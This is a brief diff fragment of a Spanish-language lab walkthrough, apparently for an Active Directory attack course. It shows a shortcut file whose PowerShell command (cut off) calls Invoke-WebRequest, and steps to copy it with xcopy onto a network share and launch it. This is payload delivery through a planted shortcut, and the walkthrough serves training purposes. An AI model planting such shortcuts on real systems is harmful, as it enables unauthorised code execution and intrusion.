@@ -49,3 +49,9 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRe
 ```
 
 Y guardarlo como *student97.lnk*
+Este *shortcut* lo copiaremos en *\\\dcorp-ci\AI*
+```shell
+xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
+```
+
+Ahora lo ejecutaremos haciendo doble clic
